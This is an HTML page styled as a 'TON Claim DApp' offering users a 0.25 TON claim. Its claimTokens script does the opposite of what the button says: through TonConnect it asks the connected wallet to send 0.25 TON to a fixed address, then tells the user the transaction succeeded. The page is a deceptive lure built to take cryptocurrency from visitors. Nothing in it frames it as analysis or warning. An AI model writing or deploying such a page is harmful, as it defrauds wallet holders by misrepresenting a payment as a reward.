<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Claim DApp</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
    <div style="text-align: center; padding: 20px;">
        <h1>TON Claim DApp</h1>
        <div id="wallet-section">
            <button id="connect-button">Connect Wallet</button>
            <div id="wallet-status"></div>
        </div>
        <div id="claim-section" style="display:none; margin-top: 20px;">
            <button onclick="claimTokens()" id="claim-button">Claim 0.25 TON</button>
        </div>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://hasan199191.github.io/my-telegram-bot/tonconnect-manifest.json'
        });

        async function checkConnection() {
            const wallet = await tonConnectUI.getWalletInfo();
            if (wallet) {
                document.getElementById('wallet-status').innerText = `Connected: ${wallet.account.address}`;
                document.getElementById('claim-section').style.display = 'block';
                document.getElementById('connect-button').style.display = 'none';
            }
        }

        tonConnectUI.onStatusChange(async (wallet) => {
            if (wallet) {
                await checkConnection();
            } else {
                document.getElementById('claim-section').style.display = 'none';
                document.getElementById('connect-button').style.display = 'block';
                document.getElementById('wallet-status').innerText = '';
            }
        });

        async function claimTokens() {
            try {
                const wallet = await tonConnectUI.getWalletInfo();
                if (!wallet) {
                    throw new Error('Wallet not connected');
                }

                const transaction = {
                    messages: [
                        {
                            address: "EQCBlhS0J_g7MZDJkBIb1mczcvbTmuiHXbi5smTxFWukVF5n",
                            amount: "250000000"
                        }
                    ],
                    validUntil: Date.now() + 300000
                };

                document.getElementById('claim-button').disabled = true;
                const result = await tonConnectUI.sendTransaction(transaction);
                console.log('Transaction sent:', result);
                alert('Transaction sent successfully!');
            } catch (error) {
                console.error('Transaction error:', error);
                alert(error.message || 'Transaction failed');
            } finally {
                document.getElementById('claim-button').disabled = false;
            }
        }

        // Initial connection check
        checkConnection();
    </script>
</body>
</html>
